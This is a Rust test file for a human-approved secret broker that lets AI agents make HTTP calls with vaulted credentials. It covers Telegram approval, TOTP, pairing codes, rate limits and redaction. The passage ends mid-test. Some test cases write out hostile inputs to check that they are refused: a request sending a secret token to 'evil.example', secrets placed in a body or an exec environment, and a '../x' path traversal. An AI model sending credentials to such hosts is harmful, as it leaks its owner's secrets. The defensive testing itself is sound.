//! Core scenarios ported from internal/web/e2e_test.go and internal/core
//! tests, driven against a fake Telegram Bot API and a fake target service.

use super::*;
use crate::policy::{CHOICE_REF, FieldMeta};
use axum::Router;
use axum::body::Bytes;
use axum::extract::{Path as AxPath, State as AxState};
use axum::http::{HeaderMap, Uri};
use axum::routing::any;
use std::path::Path;
use std::sync::Mutex as StdMutex;
use std::sync::atomic::{AtomicI64, AtomicUsize, Ordering};
use std::time::Instant;

const PASS: &str = "correct horse battery staple";
const SECRET: &str = "gitea-token-VALUE-0123456789";
const BOT_TOK: &str = "123:BOTTOKEN";
const OWNER: i64 = 1001;
const STRANGER: i64 = 666;

// --- fake Telegram ---

#[derive(Default)]
struct TgState {
    next_id: i64,
    updates: Vec<Value>,
    sent: Vec<Value>,
    answers: Vec<String>,
    edits: Vec<String>,
}

#[derive(Default)]
struct FakeTg {
    st: StdMutex<TgState>,
}

async fn tg_handler(
    AxState(f): AxState<Arc<FakeTg>>,
    AxPath(path): AxPath<String>,
    body: Bytes,
) -> axum::Json<Value> {
    let (bot, method) = path.split_once('/').unwrap_or((&path, ""));
    if bot != format!("bot{BOT_TOK}") {
        return axum::Json(json!({"ok": false, "description": "Unauthorized"}));
    }
    let input: Value = serde_json::from_slice(&body).unwrap_or(Value::Null);
    let reply = |v: Value| axum::Json(json!({"ok": true, "result": v}));
    match method {
        "getMe" => reply(json!({"username": "ucanrun_test_bot"})),
        "sendMessage" => {
            let mut s = f.st.lock().unwrap();
            s.sent.push(input);
            reply(json!({"message_id": s.sent.len()}))
        }
        "answerCallbackQuery" => {
            let t = input["text"].as_str().unwrap_or("").to_string();
            f.st.lock().unwrap().answers.push(t);
            reply(json!(true))
        }
        "editMessageText" => {
            let t = input["text"].as_str().unwrap_or("").to_string();
            f.st.lock().unwrap().edits.push(t);
            reply(json!(true))
        }
        "getUpdates" => {
            let off = input["offset"].as_i64().unwrap_or(0);
            if off < 0 {
                return reply(json!([]));
            }
            let deadline = Instant::now() + Duration::from_millis(150);
            while Instant::now() < deadline {
                let out: Vec<Value> = {
                    let s = f.st.lock().unwrap();
                    s.updates
                        .iter()
                        .filter(|u| u["update_id"].as_i64().unwrap() >= off)
                        .cloned()
                        .collect()
                };
                if !out.is_empty() {
                    return reply(Value::Array(out));
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            reply(json!([]))
        }
        _ => reply(Value::Null),
    }
}

impl FakeTg {
    fn push(&self, mut u: Value) {
        let mut s = self.st.lock().unwrap();
        s.next_id += 1;
        u["update_id"] = json!(s.next_id);
        s.updates.push(u);
    }

    fn text(&self, user: i64, chat: i64, t: &str) {
        self.push(json!({"message": {"message_id": 1, "text": t,
            "from": {"id": user}, "chat": {"id": chat, "type": "private"}}}));
    }

    fn press(&self, user: i64, chat: i64, data: &str) {
        self.push(
            json!({"callback_query": {"id": "cb", "data": data, "from": {"id": user},
            "message": {"chat": {"id": chat}}}}),
        );
    }

    fn dump(&self) -> String {
        let s = self.st.lock().unwrap();
        serde_json::to_string(&json!([s.sent, s.answers, s.edits])).unwrap()
    }

    /// Callback data of the first button of the newest approval message,
    /// once that message mentions `want`.
    async fn last_button(&self, want: &str) -> String {
        let mut data = String::new();
        wait_for(&format!("approval message {want}"), || {
            let s = self.st.lock().unwrap();
            let Some(m) = s
                .sent
                .iter()
                .rev()
                .find(|m| m.get("reply_markup").is_some())
            else {
                return false;
            };
            if !m["text"].as_str().unwrap().contains(want) {
                return false;
            }
            data = m["reply_markup"]["inline_keyboard"][0][0]["callback_data"]
                .as_str()
                .unwrap()
                .to_string();
            true
        })
        .await;
        data
    }
}

// --- fake target service ---

#[derive(Default)]
struct Target {
    auth: StdMutex<String>,
    path: StdMutex<String>,
    pass: StdMutex<String>,
    hits: AtomicUsize,
}

async fn target_handler(AxState(t): AxState<Arc<Target>>, uri: Uri, headers: HeaderMap) -> String {
    let h = |k: &str| {
        headers
            .get(k)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string()
    };
    let (auth, pass) = (h("authorization"), h("x-pass"));
    *t.auth.lock().unwrap() = auth.clone();
    *t.path.lock().unwrap() = uri.path().to_string();
    *t.pass.lock().unwrap() = pass.clone();
    t.hits.fetch_add(1, Ordering::SeqCst);
    format!(
        "created, debug header was {auth}; pass {pass}; path {}",
        uri.path()
    )
}

async fn serve(r: Router) -> String {
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(l, r).await.unwrap() });
    format!("http://{addr}")
}

async fn wait_for(what: &str, mut cond: impl FnMut() -> bool) {
    let end = Instant::now() + Duration::from_secs(10);
    while Instant::now() < end {
        if cond() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    panic!("timed out waiting for {what}");
}

// --- environment ---

struct Env {
    _tmp: tempfile::TempDir,
    dir: PathBuf,
    c: Arc<Core>,
    tg: Arc<FakeTg>,
    target: Arc<Target>,
    url: String,
    offset: Arc<AtomicI64>,
}

fn params(kv: &[(&str, &str)]) -> BTreeMap<String, String> {
    kv.iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect()
}

fn profile(v: Value) -> Profile {
    serde_json::from_value(v).unwrap()
}

fn clock(offset: Arc<AtomicI64>) -> Clock {
    Arc::new(move || {
        let o = offset.load(Ordering::SeqCst);
        if o >= 0 {
            SystemTime::now() + Duration::from_secs(o as u64)
        } else {
            SystemTime::now() - Duration::from_secs((-o) as u64)
        }
    })
}

async fn new_env(lang: &str, allow_exec: bool) -> Env {
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().join("data");
    let tg = Arc::new(FakeTg::default());
    let tg_url = serve(
        Router::new()
            .route("/{*path}", any(tg_handler))
            .with_state(tg.clone()),
    )
    .await;
    let target = Arc::new(Target::default());
    let url = serve(
        Router::new()
            .fallback(target_handler)
            .with_state(target.clone()),
    )
    .await;
    let offset = Arc::new(AtomicI64::new(0));
    let c = Core::new(Options {
        data_dir: dir.clone(),
        approval_ttl: Duration::from_secs(60),
        telegram_api: tg_url,
        work_factor: 10,
        allow_exec,
        lang: lang.into(),
        now: Some(clock(offset.clone())),
    })
    .unwrap();
    Env {
        _tmp: tmp,
        dir,
        c,
        tg,
        target,
        url,
        offset,
    }
}

async fn setup() -> Env {
    let e = new_env("vi", false).await;
    assert!(e.c.setup(b"too short").is_err());
    e.c.setup(PASS.as_bytes()).unwrap();
    assert!(matches!(
        e.c.setup(b"another long password"),
        Err(Error::Vault(vault::Error::Exists))
    ));
    e.c.put_secret("gitea", SECRET.as_bytes()).unwrap();
    e.profile("create", "low", false);
    e.profile("danger", "high", false);
    e.profile("auto", "low", true);
    e
}

impl Env {
    fn profile(&self, name: &str, risk: &str, auto: bool) {
        self.c
            .put_profile(profile(json!({
                "name": name, "risk": risk, "auto_approve": auto,
                "params": [{"name": "repo", "pattern": "[a-z0-9-]+", "required": true}],
                "http": {"method": "POST", "url": format!("{}/repos/{{{{repo}}}}", self.url),
                         "headers": {"Authorization": "token {{secret:gitea}}"}}
            })))
            .unwrap();
    }

    fn token(&self, name: &str, profiles: &[&str]) -> (Token, String) {
        let v = self
            .c
            .create_token(name, profiles.iter().map(|s| s.to_string()).collect())
            .unwrap();
        (self.c.authenticate(&v).unwrap(), v)
    }

    fn now(&self) -> SystemTime {
        self.c.now()
    }

    fn hits(&self) -> usize {
        self.target.hits.load(Ordering::SeqCst)
    }

    fn auth(&self) -> String {
        self.target.auth.lock().unwrap().clone()
    }

    async fn pair(&self) {
        let (bot, code) = self.c.set_telegram_token(BOT_TOK).await.unwrap();
        assert_eq!(bot, "ucanrun_test_bot");
        self.tg.text(STRANGER, STRANGER, "/pair wrong-code");
        self.tg.text(OWNER, OWNER, &format!("/pair {code}"));
        wait_for("pairing", || self.c.telegram_status().paired).await;
        assert_eq!(self.c.telegram_status().user_id, OWNER);
    }

    /// Enrolls TOTP with the previous step, leaving current and next free.
    fn enable_totp(&self) -> (String, Vec<String>) {
        let (sec, uri) = self.c.totp_start().unwrap();
        assert!(uri.starts_with("otpauth://totp/"));
        let code = totp::code(&sec, unix(self.now()) - 30).unwrap();
        let codes = self.c.totp_confirm(&code).unwrap();
        (sec, codes)
    }

    fn code_now(&self, sec: &str) -> String {
        totp::code(sec, unix(self.now())).unwrap()
    }

    async fn wait_state(&self, id: &str, want: ReqState) -> Request {
        let mut r = None;
        wait_for(&format!("state {}", want.as_str()), || {
            r = self.c.get(id);
            r.as_ref().is_some_and(|r| r.state == want)
        })
        .await;
        r.unwrap()
    }

    fn no_secret_anywhere(&self) {
        assert!(!self.tg.dump().contains(SECRET), "secret reached Telegram");
        fn walk(p: &Path) {
            for e in std::fs::read_dir(p).unwrap() {
                let e = e.unwrap();
                if e.file_type().unwrap().is_dir() {
                    walk(&e.path());
                    continue;
                }
                let b = String::from_utf8_lossy(&std::fs::read(e.path()).unwrap()).into_owned();
                assert!(
                    !b.contains(SECRET) && !b.contains(BOT_TOK),
                    "plaintext secret in {:?}",
                    e.path()
                );
            }
        }
        walk(&self.dir);
    }

    fn audit_events(&self, n: usize) -> Vec<String> {
        self.c
            .audit
            .tail(n)
            .unwrap()
            .into_iter()
            .map(|e| e.event)
            .collect()
    }
}

fn btn_for(r: &Request, suffix: &str) -> String {
    format!("a:{}:{}{suffix}", r.id, &r.hash[..16])
}

// --- Telegram approval ---

#[tokio::test(flavor = "multi_thread")]
async fn approve_on_telegram_runs_and_hides_secret() {
    let e = setup().await;
    e.pair().await;
    let (t, _) = e.token("claude", &[]);
    let r =
        e.c.submit(&t, "create", params(&[("repo", "foo")]), "cần repo mới")
            .unwrap();
    assert_eq!(r.state, ReqState::Pending);
    assert_eq!(e.hits(), 0, "ran before approval");
    let btn = e.tg.last_button("/repos/foo").await;
    let d = e.tg.dump();
    assert!(
        d.contains("agent tự khai") && d.contains("‹secret:gitea›"),
        "{d}"
    );
    // A stranger, and the owner in another chat, must both fail.
    e.tg.press(STRANGER, OWNER, &btn);
    e.tg.press(OWNER, STRANGER, &btn);
    wait_for("strangers refused", || {
        e.tg.dump().matches("Không có quyền").count() == 2
    })
    .await;
    assert_eq!(e.c.get(&r.id).unwrap().state, ReqState::Pending);
    e.tg.press(OWNER, OWNER, &btn);
    let q = e.wait_state(&r.id, ReqState::Done).await;
    assert_eq!(e.auth(), format!("token {SECRET}"));
    let out = &q.result.as_ref().unwrap().output;
    assert!(!out.contains(SECRET) && out.contains("[REDACTED]"), "{out}");
    // A second press must not run it again.
    e.tg.press(OWNER, OWNER, &btn);
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(e.hits(), 1);
    wait_for("buttons removed", || e.tg.dump().contains("Kết thúc: done")).await;
    let j = serde_json::to_string(&e.c.get(&r.id).unwrap()).unwrap();
    assert!(!j.contains(SECRET));
    assert!(j.contains("\"state\":\"done\"") && j.contains("\"created\":\""));
    e.no_secret_anywhere();
    assert!(audit::verify(&e.dir.join("audit.jsonl")).unwrap() > 0);
}

#[tokio::test(flavor = "multi_thread")]
async fn deny_expire_and_wrong_hash() {
    let e = setup().await;
    e.pair().await;
    let (t, _) = e.token("claude", &[]);
    let r =
        e.c.submit(&t, "create", params(&[("repo", "a")]), "")
            .unwrap();
    let zeros = "0".repeat(64);
    assert!(matches!(
        e.c.decide(&r.id, &zeros, true, "web", "", ""),
        Err(Error::HashChange)
    ));
    assert!(matches!(
        e.c.decide(&r.id, "", true, "web", "", ""),
        Err(Error::HashChange)
    ));
    assert!(matches!(
        e.c.decide(&r.id, &r.hash[..15], true, "web", "", ""),
        Err(Error::HashChange)
    ));
    assert!(matches!(
        e.c.decide("nope", &r.hash, true, "web", "", ""),
        Err(Error::Decided)
    ));
    // Silence is not approval: the expiry loop denies it.
    e.offset.store(61, Ordering::SeqCst);
    e.wait_state(&r.id, ReqState::Expired).await;
    let err = e.c.decide(&r.id, &r.hash, true, "web", "", "").unwrap_err();
    assert_eq!(err.to_string(), "yêu cầu đã được xử lý hoặc hết hạn");
    wait_for("expiry shown", || {
        e.tg.dump().contains("Kết thúc: expired (ttl)")
    })
    .await;

    let r =
        e.c.submit(&t, "create", params(&[("repo", "b")]), "")
            .unwrap();
    let btn = e.tg.last_button("/repos/b").await;
    e.tg.press(OWNER, OWNER, &btn.replacen("a:", "d:", 1));
    let q = e.wait_state(&r.id, ReqState::Denied).await;
    assert_eq!(q.decided_by, format!("telegram:{OWNER}"));
    assert_eq!(e.hits(), 0, "denied request ran");
}

#[tokio::test(flavor = "multi_thread")]
async fn high_risk_needs_totp_and_code_is_single_use() {
    let e = setup().await;
    e.pair().await;
    let (t, _) = e.token("claude", &[]);
    let r =
        e.c.submit(&t, "danger", params(&[("repo", "a")]), "")
            .unwrap();
    let err = e.c.decide(&r.id, &r.hash, true, "web", "", "").unwrap_err();
    assert_eq!(
        err.to_string(),
        "chưa bật TOTP nên chưa duyệt được yêu cầu rủi ro cao"
    );
    let (sec, _) = e.enable_totp();
    let btn = e.tg.last_button("RỦI RO CAO").await;
    e.tg.press(OWNER, OWNER, &btn);
    wait_for("totp prompt", || e.tg.dump().contains("Gửi mã TOTP")).await;
    assert_eq!(e.c.get(&r.id).unwrap().state, ReqState::Pending);
    e.tg.text(STRANGER, STRANGER, "123456");
    e.tg.text(OWNER, OWNER, "000000");
    wait_for("bad code refused", || e.tg.dump().contains("sai mã TOTP")).await;
    assert_eq!(e.c.get(&r.id).unwrap().state, ReqState::Pending);
    e.tg.press(OWNER, OWNER, &btn);
    wait_for("second prompt", || {
        e.tg.dump().matches("Gửi mã TOTP").count() == 2
    })
    .await;
    let good = e.code_now(&sec);
    e.tg.text(OWNER, OWNER, &good);
    e.wait_state(&r.id, ReqState::Done).await;

    let r2 =
        e.c.submit(&t, "danger", params(&[("repo", "b")]), "")
            .unwrap();
    assert!(matches!(
        e.c.decide(&r2.id, &r2.hash, true, "web", &good, ""),
        Err(Error::BadTotp)
    ));
    assert!(matches!(
        e.c.decide(&r2.id, &r2.hash, true, "web", "", ""),
        Err(Error::NeedTotp)
    ));
    e.no_secret_anywhere();
}

#[tokio::test(flavor = "multi_thread")]
async fn approver_chooses_secret_on_telegram() {
    let e = setup().await;
    e.pair().await;
    e.c.put_secret("other", b"second-secret-value-42").unwrap();
    e.c.put_profile(profile(json!({"name": "pick", "risk": "low",
        "secret_choices": ["gitea", "other", "absent"],
        "http": {"method": "GET", "url": format!("{}/x", e.url),
                 "headers": {"Authorization": "token {{secret:choice}}"}}})))
        .unwrap();
    let (t, _) = e.token("c", &[]);
    let r = e.c.submit(&t, "pick", BTreeMap::new(), "").unwrap();
    assert!(
        r.display.contains("‹secret bạn chọn khi duyệt›"),
        "{}",
        r.display
    );
    e.tg.last_button("Bấm tên secret").await;
    e.tg.press(STRANGER, OWNER, &btn_for(&r, ":1"));
    e.tg.press(OWNER, OWNER, &btn_for(&r, ""));
    e.tg.press(OWNER, OWNER, &btn_for(&r, ":9"));
    wait_for("invalid choice", || {
        e.tg.dump().contains("Lựa chọn không hợp lệ")
    })
    .await;
    let err =
        e.c.decide(&r.id, &r.hash, true, "web", "", "_totp_secret")
            .unwrap_err();
    assert_eq!(err.to_string(), "hãy chọn một secret trong danh sách");
    let err =
        e.c.decide(&r.id, &r.hash, true, "web", "", "absent")
            .unwrap_err();
    assert_eq!(err.to_string(), "kho chưa có secret \"absent\"");
    assert_eq!(e.hits(), 0);
    e.tg.press(OWNER, OWNER, &btn_for(&r, ":1"));
    let q = e.wait_state(&r.id, ReqState::Done).await;
    assert_eq!(e.auth(), "token second-secret-value-42");
    assert_eq!(q.secret, "other");
    assert!(!q.result.unwrap().output.contains("second-secret-value-42"));
    wait_for("secret named in result", || {
        e.tg.dump().contains("Secret đã dùng: other")
    })
    .await;
    assert!(!e.tg.dump().contains("second-secret-value-42"));
}

#[tokio::test(flavor = "multi_thread")]
async fn long_display_still_reaches_telegram() {
    let e = setup().await;
    e.pair().await;
    e.c.put_profile(profile(json!({"name": "big", "risk": "low",
        "params": [{"name": "b", "pattern": "[a-z]+", "required": true}],
        "http": {"method": "POST", "url": format!("{}/x", e.url), "body": "{{b}}"}})))
        .unwrap();
    let (t, _) = e.token("c", &[]);
    let long = "a".repeat(4000);
    e.c.submit(&t, "big", params(&[("b", &long)]), "").unwrap();
    e.tg.last_button("ĐÃ CẮT BỚT").await;
}

// --- pairing ---

#[test]
fn pair_code_shape() {
    for _ in 0..500 {
        let c = new_pair_code();
        assert_eq!(c.len(), 6);
        assert!(c.bytes().any(|b| PAIR_SYMBOLS.contains(&b)), "{c}");
        assert!(
            c.bytes()
                .all(|b| PAIR_LETTERS.contains(&b) || PAIR_SYMBOLS.contains(&b))
        );
        assert!(!c.contains(['0', 'O', '1', 'l', 'I', '_', '*', '`', '~', ' ']));
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn pair_code_is_short_and_burns_after_guesses() {
    let e = setup().await;
    assert!(e.c.new_pair_code().is_err(), "code without a bot");
    let err = e.c.set_telegram_token("999:WRONG").await.unwrap_err();
    assert_eq!(
        err.to_string(),
        "token Telegram không hợp lệ hoặc không kết nối được"
    );
    let (_, pair) = e.c.set_telegram_token(BOT_TOK).await.unwrap();
    assert_eq!(pair.len(), 6);
    assert!(e.c.telegram_status().configured);
    for i in 0..3 {
        e.tg.text(STRANGER, STRANGER, &format!("/pair guess{i}"));
    }
    e.tg.text(OWNER, OWNER, &format!("/pair {pair}")); // correct, but too late
    wait_for("code burned", || {
        e.audit_events(5).iter().any(|x| x == "pair_code_burned")
    })
    .await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(!e.c.telegram_status().paired, "paired with a burned code");
    // An expired code is refused too.
    let code = e.c.new_pair_code().unwrap();
    e.offset.store(181, Ordering::SeqCst);
    assert!(!e.c.pair(&code, OWNER, OWNER));
    e.offset.store(0, Ordering::SeqCst);
    // A new code works, once.
    let code = e.c.new_pair_code().unwrap();
    e.tg.text(OWNER, OWNER, &format!("/pair {code}"));
    wait_for("pairing", || e.c.telegram_status().paired).await;
    assert!(!e.c.pair(&code, OWNER, OWNER), "code reused");
}

// --- second factor ---

#[tokio::test(flavor = "multi_thread")]
async fn recovery_codes() {
    let e = setup().await;
    let (_, list) = e.enable_totp();
    assert_eq!(list.len(), 8);
    assert!(
        list.iter()
            .all(|c| c.len() == 11 && c.as_bytes()[5] == b'-')
    );
    let first = list[0].clone();
    let raw = std::fs::read_to_string(e.dir.join("state.json")).unwrap();
    assert!(!raw.contains(&first), "recovery code stored in plain text");
    assert!(matches!(e.c.totp_start(), Err(Error::Msg(m)) if m == "TOTP đã bật"));

    e.c.lock("web");
    assert!(matches!(
        e.c.login(PASS.as_bytes(), ""),
        Err(Error::NeedTotp)
    ));
    assert!(e.c.locked() && e.c.vault.is_locked());
    assert!(matches!(
        e.c.login(PASS.as_bytes(), "AAAAA-AAAAA"),
        Err(Error::BadTotp)
    ));
    assert!(e.c.locked());
    // Lowercase and without a dash, as typed on a phone.
    let typed = first.replace('-', "").to_lowercase();
    e.c.login(PASS.as_bytes(), &typed).unwrap();
    assert_eq!(e.c.recovery_left(), 7);
    e.c.lock("web");
    assert!(e.c.login(PASS.as_bytes(), &first).is_err(), "code reused");
    e.c.login(PASS.as_bytes(), &list[1]).unwrap();
    assert!(e.audit_events(10).iter().any(|x| x == "recovery_code_used"));

    // A recovery code must not approve high risk work.
    let (t, _) = e.token("c", &[]);
    let r =
        e.c.submit(&t, "danger", params(&[("repo", "a")]), "")
            .unwrap();
    assert!(
        e.c.decide(&r.id, &r.hash, true, "web", &list[2], "")
            .is_err()
    );
    assert_eq!(e.c.recovery_left(), 6, "decide consumed a recovery code");
    // A new phone: passphrase plus a recovery code resets TOTP.
    assert!(matches!(
        e.c.totp_reset(b"wrong wrong wrong", &list[2]),
        Err(Error::Vault(vault::Error::BadPass))
    ));
    e.c.totp_reset(PASS.as_bytes(), &list[2]).unwrap();
    assert!(!e.c.totp_enabled() && e.c.recovery_left() == 0);
    assert!(matches!(e.c.new_recovery_codes("123456"), Err(Error::Msg(m)) if m == "chưa bật TOTP"));
    let (sec2, _) = e.enable_totp();
    let now = e.code_now(&sec2);
    assert_eq!(e.c.new_recovery_codes(&now).unwrap().len(), 8);
    assert!(e.c.new_recovery_codes(&now).is_err(), "TOTP code reused");
}

#[tokio::test(flavor = "multi_thread")]
async fn failed_totp_keeps_an_open_session_open() {
    let e = setup().await;
    let (sec, _) = e.enable_totp();
    // Already unlocked: a wrong second factor fails but does not lock.
    assert!(e.c.login(PASS.as_bytes(), "AAAAA-AAAAB").is_err());
    assert!(!e.c.locked());
    e.c.login(PASS.as_bytes(), &e.code_now(&sec)).unwrap();
    assert!(e.audit_events(5).iter().any(|x| x == "login_failed"));
}

// --- agents ---

#[tokio::test(flavor = "multi_thread")]
async fn agent_boundaries() {
    let e = setup().await;
    let (limited, limited_val) = e.token("limited", &["create"]);
    assert!(matches!(
        e.c.submit(&limited, "danger", params(&[("repo", "a")]), ""),
        Err(Error::Forbidden)
    ));
    assert!(e.audit_events(3).iter().any(|x| x == "request_forbidden"));
    let err =
        e.c.submit(&limited, "create", params(&[("repo", "../x")]), "")
            .unwrap_err();
    assert_eq!(err.to_string(), "param \"repo\" does not match its pattern");
    let err =
        e.c.submit(
            &limited,
            "create",
            params(&[("repo", "a"), ("extra", "b")]),
            "",
        )
        .unwrap_err();
    assert_eq!(err.to_string(), "unknown param \"extra\"");
    assert!(matches!(
        e.c.submit(&limited, "ghost", BTreeMap::new(), ""),
        Err(Error::Forbidden)
    ));
    assert!(matches!(
        e.c.authenticate("ucr_nope"),
        Err(Error::Forbidden)
    ));
    let (other, _) = e.token("other", &[]);
    assert!(matches!(
        e.c.submit(&other, "ghost", BTreeMap::new(), ""),
        Err(Error::NotFound)
    ));
    e.c.submit(&limited, "create", params(&[("repo", "a")]), "")
        .unwrap();
    // Approval spam is capped per caller.
    let mut ok = 0;
    let mut last = None;
    for _ in 0..8 {
        match e.c.submit(&other, "create", params(&[("repo", "a")]), "") {
            Ok(_) => ok += 1,
            Err(x) => last = Some(x),
        }
    }
    assert_eq!(ok, 5);
    let last = last.unwrap();
    assert!(matches!(last, Error::Busy) && last.status() == 429);
    // Revocation applies immediately.
    for tk in e.c.tokens().unwrap() {
        assert!(tk.hash.is_empty());
        e.c.revoke_token(&tk.id).unwrap();
    }
    assert!(matches!(
        e.c.authenticate(&limited_val),
        Err(Error::Forbidden)
    ));
    // Profile listing hides templates, hosts and secret names.
    let (c, _) = e.token("c", &[]);
    let v = serde_json::to_string(&e.c.profiles_for(&c).unwrap()).unwrap();
    assert!(!v.contains("gitea") && !v.contains("127.0.0.1"), "{v}");
    assert!(v.contains("\"repo\""));
    let (narrow, _) = e.token("narrow", &["auto"]);
    let names: Vec<String> =
        e.c.profiles_for(&narrow)
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
    assert_eq!(names, ["auto"]);
}

#[tokio::test(flavor = "multi_thread")]
async fn auto_approve_runs() {
    let e = setup().await;
    let (t, _) = e.token("c", &[]);
    let r =
        e.c.submit(&t, "auto", params(&[("repo", "a")]), "")
            .unwrap();
    assert_eq!(r.state, ReqState::Running);
    let q = e.c.wait(&r.id, Some(Duration::from_secs(5))).await.unwrap();
    assert_eq!(q.state, ReqState::Done);
    assert_eq!(q.decided_by, "auto");
}

#[tokio::test(flavor = "multi_thread")]
async fn token_names_unique_and_rate_limited() {
    let e = setup().await;
    e.token("dup", &[]);
    assert_eq!(
        e.c.create_token("dup", vec![]).unwrap_err().to_string(),
        "tên token đã tồn tại"
    );
    assert_eq!(
        e.c.create_token("   ", vec![]).unwrap_err().to_string(),
        "tên token không hợp lệ"
    );
    assert!(e.c.create_token(&"x".repeat(65), vec![]).is_err());
    let (flood, _) = e.token("flood", &[]);
    let mut ok = 0;
    let mut last = None;
    for _ in 0..40 {
        match e.c.submit(&flood, "auto", params(&[("repo", "a")]), "") {
            Ok(_) => ok += 1,
            Err(x) => last = Some(x),
        }
    }
    assert_eq!(ok, 30);
    assert!(matches!(last, Some(Error::Busy)));
    // The window slides.
    e.offset.store(601, Ordering::SeqCst);
    e.c.submit(&flood, "auto", params(&[("repo", "a")]), "")
        .unwrap();
    // Newest first.
    let names: Vec<String> = e.c.tokens().unwrap().into_iter().map(|t| t.name).collect();
    assert_eq!(names, ["flood", "dup"]);
}

#[tokio::test(flavor = "multi_thread")]
async fn agent_call_with_secret_notes() {
    let e = setup().await;
    e.pair().await;
    let host = e.url.trim_start_matches("http://").to_string();
    let (c, _) = e.token("c", &[]);
    assert!(e.c.secrets_for(&c).unwrap().is_empty());
    e.c.set_secret_meta(
        "gitea",
        SecretMeta {
            description: "Token cho dịch vụ thử".into(),
            hosts: vec![host.clone()],
            ..Default::default()
        },
    )
    .unwrap();
    let v = serde_json::to_string(&e.c.secrets_for(&c).unwrap()).unwrap();
    assert!(
        v.contains("Token cho dịch vụ thử") && !v.contains(SECRET),
        "{v}"
    );
    let call: Call = serde_json::from_value(json!({"http": {"method": "GET",
        "url": format!("{}/user", e.url),
        "headers": {"Authorization": "Bearer {{secret:gitea}}"}}}))
    .unwrap();
    let r = e.c.submit_call(&c, &call, "xem tài khoản").unwrap();
    assert_eq!(r.profile, policy::ADHOC_PROFILE);
    e.tg.last_button("Agent tự soạn lệnh").await;
    assert_eq!(e.hits(), 0);
    e.tg.press(OWNER, OWNER, &btn_for(&r, ""));
    let q = e.wait_state(&r.id, ReqState::Done).await;
    assert_eq!(e.auth(), format!("Bearer {SECRET}"));
    assert!(!q.result.unwrap().output.contains(SECRET));
    // Another host, the body, and exec are refused.
    let exec_off = Error::ExecOff.to_string();
    for (name, raw, want) in [
        (
            "other host",
            json!({"http": {"method": "GET", "url": "https://evil.example/x",
                "headers": {"Authorization": "Bearer {{secret:gitea}}"}}}),
            "secret \"gitea\" may not be sent to evil.example",
        ),
        (
            "in body",
            json!({"http": {"method": "POST", "url": format!("{}/x", e.url), "body": "{{secret:gitea}}"}}),
            "secrets go in headers only, never in the url or body",
        ),
        (
            "exec off",
            json!({"exec": {"argv": ["/usr/bin/env"], "env": {"T": "{{secret:gitea}}"}}}),
            exec_off.as_str(),
        ),
    ] {
        let call: Call = serde_json::from_value(raw).unwrap();
        let err = e.c.submit_call(&c, &call, "").unwrap_err();
        assert_eq!(err.to_string(), want, "{name}");
    }
    let (narrow, _) = e.token("narrow", &["create"]);
    assert!(matches!(
        e.c.submit_call(&narrow, &call, ""),
        Err(Error::Forbidden)
    ));
    e.c.set_secret_meta(
        "gitea",
        SecretMeta {
            description: "đổi mô tả".into(),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(
        e.c.set_secret_meta(
            "gitea",
            SecretMeta {
                hosts: vec!["https://bad".into()],
                ..Default::default()
            },
        )
        .is_err()
    );
    assert!(e.c.secrets_for(&c).unwrap().is_empty(), "no hosts left");
}

// --- multi-field secrets ---

fn db_meta(host: &str) -> SecretMeta {
    serde_json::from_value(json!({"description": "Database", "hosts": [host],
        "fields": [{"name": "host", "public": true}, {"name": "user", "public": true},
                   {"name": "password", "public": false}]}))
    .unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn multi_field_secret() {
    let e = setup().await;
    let host = e.url.trim_start_matches("http://").to_string();
    let vals = params(&[
        ("host", "pub-host-name"),
        ("user", "alice-user"),
        ("password", "hunter2-private-pass"),
    ]);
    assert!(
        e.c.put_secret_fields("db", SecretMeta::default(), &vals)
            .is_err()
    );
    let err =
        e.c.put_secret_fields("db", db_meta(&host), &params(&[("host", "h")]))
            .unwrap_err();
    assert_eq!(err.to_string(), "field \"user\" needs a value");
    assert!(e.c.put_secret_fields("_db", db_meta(&host), &vals).is_err());
    e.c.put_secret_fields("db", db_meta(&host), &vals).unwrap();

    // Agents see public values only.
    let (t, _) = e.token("agent", &[]);
    let infos = e.c.secrets_for(&t).unwrap();
    let db = infos.iter().find(|s| s.name == "db").unwrap();
    let got: Vec<(&str, bool, Option<&str>)> = db
        .fields
        .iter()
        .map(|f| (f.name.as_str(), f.public, f.value.as_deref()))
        .collect();
    assert_eq!(
        got,
        [
            ("host", true, Some("pub-host-name")),
            ("user", true, Some("alice-user")),
            ("password", false, None)
        ]
    );
    let j = serde_json::to_string(&infos).unwrap();
    assert!(!j.contains("hunter2"), "{j}");
    assert_eq!(
        e.c.secret_public_values("db").unwrap(),
        params(&[("host", "pub-host-name"), ("user", "alice-user")])
    );

    // A public field in the URL path, a private one in a header.
    let call: Call = serde_json::from_value(json!({"http": {"method": "GET",
        "url": format!("{}/q/{{{{secret:db.host}}}}", e.url),
        "headers": {"X-Pass": "{{secret:db.password}}"}}}))
    .unwrap();
    let r = e.c.submit_call(&t, &call, "").unwrap();
    assert!(r.display.contains("/q/‹secret:db.host›"), "{}", r.display);
    e.c.decide(&r.id, &r.hash, true, "web", "", "").unwrap();
    let q = e.wait_state(&r.id, ReqState::Done).await;
    assert_eq!(*e.target.path.lock().unwrap(), "/q/pub-host-name");
    assert_eq!(*e.target.pass.lock().unwrap(), "hunter2-private-pass");
    let out = q.result.unwrap().output;
    assert!(out.contains("path /q/pub-host-name"), "{out}");
    assert!(
        !out.contains("hunter2-private-pass") && out.contains("pass [REDACTED]"),
        "{out}"
    );

    // A bare name or an unknown field is refused.
    for (r, want) in [
        ("db", "secret \"db\" has fields, use {{secret:db.FIELD}}"),
        ("db.nope", "unknown field \"nope\" of secret \"db\""),
    ] {
        let call: Call = serde_json::from_value(json!({"http": {"method": "GET",
            "url": format!("{}/x", e.url), "headers": {"X": format!("{{{{secret:{r}}}}}")}}}))
        .unwrap();
        assert_eq!(
            e.c.submit_call(&t, &call, "").unwrap_err().to_string(),
            want
        );
    }
